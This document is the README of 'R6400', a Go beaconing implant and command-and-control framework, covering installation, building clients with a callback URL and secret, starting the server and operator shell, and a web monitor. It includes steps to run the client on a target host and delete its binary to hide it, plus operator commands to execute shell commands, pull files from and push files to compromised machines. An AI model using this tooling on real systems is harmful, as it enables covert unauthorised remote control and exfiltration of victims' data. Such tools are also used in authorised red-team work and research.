# R6400 Version 1.0

[![Generic badge](https://img.shields.io/badge/Go-v1.14-blue.svg)](https://shields.io/) [![GitHub license](https://img.shields.io/github/license/Naereen/StrapDown.js.svg)](https://github.com/Naereen/StrapDown.js/blob/master/LICENSE)

At the moment it is a simple beaconing implant written in Go.  Components of r6400 are a client, Listening server and interactive shell.  The client communicates with the server over HTTP (no ssl) at a specified calls interval.  A client can be tasked using the interactive shell to pull and push files, and execute commands on the target host.

## Getting Started

#### Install dependencies (Debian and Ubuntu)
```
Apt update && apt -y upgrade && apt -y install build-essential postgresql screen vim git upx
```

#### Install GO
```
wget https://dl.google.com/go/go1.14.1.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.14.1.linuxamd64.gar.gz
rm -f go1.14.1.linux-amd64.tar.gz

echo "export PATH=$PATH:/usr/local/go/bin" >> ~/.profile
source ~/.profile
```

#### Get R6400
```
git clone https://github.com/m4cybersolutions/r6400.git
```

#### Install Go Dependences
```
cd r6400
make deps
```

#### Setup Postres
```
# Start the postgres service
service postgresql start

# Change to the postgres user
su - postgres

# Create a new user
createuser --interactive --pwprompt
# Enter name of role to add: test
# Enter password for new role: pass
# Enter it again: pass
# Shall the new role be a super user? (y/n) y

# Create the database
psql
CREATE DATABASE oso;
\q

# Exit from the postgres user
exit
```

#### Building with the Makefile

Edit the Make file to include the IP for your server and any client specific information.  This can be overridden from the command line as an alternative.  Additional archectures can be added.  To view a list of architectures suppored natively by go, use the go tool command.

```
go tool dist list
```

#### Generic build instructions with make
```
cd r6400

# Build the server
make build_server

# Build the shell
make build_shell

# Build a client
make build_r6400

# Make a custom client with and over ride TARG name
make build_r6400 TARG=M0001

# Make a custom client and over ride all options
make build_r6400 TARG=A0001 URL=https://localhost:8443/tasking SECRET=work CALLS=30 RING=10
```

#### Start the Server
```
cd server
./server -c config.yml

# Starting the Server in a screen session
screen -S r6400_Server
./server -c config.yml
 
# Background the screen session
 ctrl+a d

# To interact with the screen session
 screen -ls (to ensure it is still running)
 screen -x r6400_Server
```

#### Start the Shell
```
cd shell
./shell -c config.yml

# Starting the Server in a screen session
screen -S r6400_Shell
./shell -c config.yml
 
# Background the screen session 
 ctrl+a d

# To interact with the screen session 
 screen -ls (to ensure it is still running)
 screen -x r6400_Shell
```

#### Execute client on target host
```
# Start client
./client &

# To run in memory after starting
rm -f client
```

#### Validate Postgres database
```
# Login to shell
sudo -u postgres psql

# Connect to oso database
\c r6400

# View tables
\dt

# Drop old tables
DROP TABLE users,agents,results,tasks,tokens;
```

#### Basic usage
```
spys					: List available spys
spy <node>				: Tag into spy for interaction.  spy without a name brings the user back to home and lists spys.
schedule <command>			: Schedule the client to execute a command. Must start with shell. Ex: /bin/bash, /bin/sh, cmd.exe
scheduled				: Show jobs in the queue not yet deployed for current spy
fire					: Move scheduled jobs into fired queue.  Spy can access jobs only once fired.
revoke 					: Remove fired jobs
revoke reschedule			: Removes fired jobs and places them in the scheduled que to allow for additional commands to be added
flush 					: Flush commands in the scheduled queue
set calls <int>				: Task the spy to modify it's calls interval in seconds.
set ring <int>				: task the spy to offset the calls by (+/-) x seconds.
kill 					: Kill the spy process
job <job id>				: Show the output from a job
jobs					: List complete and deployed jobs
pull <remote file>			: Pulle a file from the target machine.
push <local file> <remote file>		: Push a local file to the target machine.
forget <node>				: Remove a client from the database
dump client 				: Not yet implemented
dump job				: Not yet implemented
```

#### Web Interface monitor

This python script provides a simple web interface that allows the user to have a quick refernce for available nodes, first seen and last seen, along with status of jobs deployed.  Because this is written in python flask it is only recommended to run on the local host ip and use ssh for remote port forward if placing on a different computer.  This application requires a login for access.  Currently the /create-user page is not set to force a login for view.  This can be fixed by uncommenting the four lines on the index/routes.py file under the /create-user route.  If these lines are uncommented the only username which can access this page afterwards is admin.

#### Setup the Web interface monitor

```
cd monitor
apt install python3
pip3 install -r requirements.txt
```

#### Start the Web interface monitor

The BlackBriar1.py script takes a -i for IP address and -p for port

```
python3 BlackBriar1.py -i 127.0.0.1 -p 8000
```

#### Create a new user

Open a browser and browse to http://127.0.0.1:8000/create-user

#### Log in and view Web interface monitor

Open a browser and browse to http://127.0.0.1:8000/login

#### TO DO

1. Add database column that indicates bool value for files.

2. Write files pulled to out folder instead of database.  based on bool value. Preserve pull path

3. Add shell feature to dump client results and commands to disk

4. Add shell command to wipe database

5. Add a scheduler option to run recuring commands at a given interval

6. Add a default option for commands for first check in from clients
